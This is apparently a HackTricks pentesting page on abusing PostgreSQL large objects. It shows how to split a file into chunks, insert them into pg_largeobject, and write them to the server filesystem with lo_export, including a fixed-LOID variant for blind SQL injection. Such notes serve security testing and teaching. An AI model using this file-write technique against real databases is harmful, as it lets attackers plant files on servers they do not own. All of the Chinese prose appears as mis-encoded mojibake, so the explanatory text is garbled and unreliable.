<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

### PostgreSQLå¤§å¯¹è±¡

PostgreSQLæä¾›äº†ä¸€ç§ç§°ä¸º**å¤§å¯¹è±¡**çš„ç»“æ„ï¼Œå¯é€šè¿‡`pg_largeobject`è¡¨è®¿é—®ï¼Œæ—¨åœ¨å­˜å‚¨å¤§æ•°æ®ç±»å‹ï¼Œå¦‚å›¾åƒæˆ–PDFæ–‡æ¡£ã€‚è¿™ç§æ–¹æ³•ä¼˜äº`COPY TO`å‡½æ•°ï¼Œå› ä¸ºå®ƒå¯ä»¥å°†æ•°æ®**å¯¼å‡ºå›æ–‡ä»¶ç³»ç»Ÿ**ï¼Œç¡®ä¿åŸå§‹æ–‡ä»¶çš„ç²¾ç¡®å‰¯æœ¬å¾—ä»¥ä¿ç•™ã€‚

è¦åœ¨æ­¤è¡¨ä¸­**å­˜å‚¨å®Œæ•´æ–‡ä»¶**ï¼Œå¿…é¡»åœ¨`pg_largeobject`è¡¨ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ˆç”±LOIDæ ‡è¯†ï¼‰ï¼Œç„¶åå°†æ¯ä¸ª2KBå¤§å°çš„æ•°æ®å—æ’å…¥åˆ°æ­¤å¯¹è±¡ä¸­ã€‚è¿™äº›å—çš„å¤§å°å¿…é¡»ç¡®åˆ‡ä¸º2KBï¼ˆæœ€åä¸€ä¸ªå—å¯èƒ½æœ‰ä¾‹å¤–ï¼‰ï¼Œä»¥ç¡®ä¿å¯¼å‡ºåŠŸèƒ½æ­£å¸¸è¿è¡Œã€‚

è¦å°†æ‚¨çš„**äºŒè¿›åˆ¶æ•°æ®åˆ†æˆ2KBå—**ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```bash
split -b 2048 your_file # Creates 2KB sized files
```
å¯¹äºå°†æ¯ä¸ªæ–‡ä»¶ç¼–ç ä¸ºBase64æˆ–Hexï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**é‡è¦æç¤º**ï¼šåœ¨è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹æ—¶ï¼Œè¯·ç¡®ä¿å‘é€2KBæ¸…æ™°æ–‡æœ¬å­—èŠ‚çš„å—ã€‚ç”±äºå¤§å°åŠ å€ï¼Œåå…­è¿›åˆ¶ç¼–ç æ–‡ä»¶æ¯ä¸ªå—éœ€è¦4KBæ•°æ®ï¼Œè€ŒBase64ç¼–ç æ–‡ä»¶éµå¾ªå…¬å¼ `ceil(n / 3) * 4`ã€‚

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æŸ¥çœ‹å¤§å‹å¯¹è±¡çš„å†…å®¹ä»¥è¿›è¡Œè°ƒè¯•ï¼š
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### ä½¿ç”¨ `lo_creat` & Base64

è¦å­˜å‚¨äºŒè¿›åˆ¶æ•°æ®ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª LOIDï¼š
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
åœ¨éœ€è¦ç²¾ç¡®æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ç›²æ³¨å…¥ï¼ˆBlind SQL Injectionï¼‰ï¼Œé¦–é€‰ä½¿ç”¨ `lo_create` æ¥æŒ‡å®šå›ºå®šçš„ LOIDã€‚

ç„¶åå¯ä»¥æŒ‰ä»¥ä¸‹æ–¹å¼æ’å…¥æ•°æ®å—ï¼š
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
è¦å¯¼å‡ºå¹¶åœ¨ä½¿ç”¨åå¯èƒ½åˆ é™¤å¤§å‹å¯¹è±¡ï¼š
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### ä½¿ç”¨ `lo_import` & Hex

`lo_import` å‡½æ•°å¯ç”¨äºåˆ›å»ºå’ŒæŒ‡å®šå¤§å¯¹è±¡çš„ LOIDï¼š
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
åœ¨åˆ›å»ºå¯¹è±¡åï¼Œæ¯é¡µæ’å…¥æ•°æ®ï¼Œç¡®ä¿æ¯ä¸ªæ•°æ®å—ä¸è¶…è¿‡2KBï¼š
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
ä¸ºäº†å®Œæˆè¿™ä¸ªè¿‡ç¨‹ï¼Œæ•°æ®è¢«å¯¼å‡ºå¹¶ä¸”å¤§å¯¹è±¡è¢«åˆ é™¤ï¼š
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### é™åˆ¶

æ³¨æ„åˆ°**å¤§å¯¹è±¡å¯èƒ½æœ‰ACLs**ï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ï¼Œå¯èƒ½ä¼šé™åˆ¶ç”šè‡³æ˜¯æ‚¨çš„ç”¨æˆ·åˆ›å»ºçš„å¯¹è±¡çš„è®¿é—®ã€‚ç„¶è€Œï¼Œå…·æœ‰å®½æ¾ACLçš„æ—§å¯¹è±¡ä»ç„¶å¯ä»¥é€šè¿‡å†…å®¹å¤–æ³„æ¥è®¿é—®ã€‚
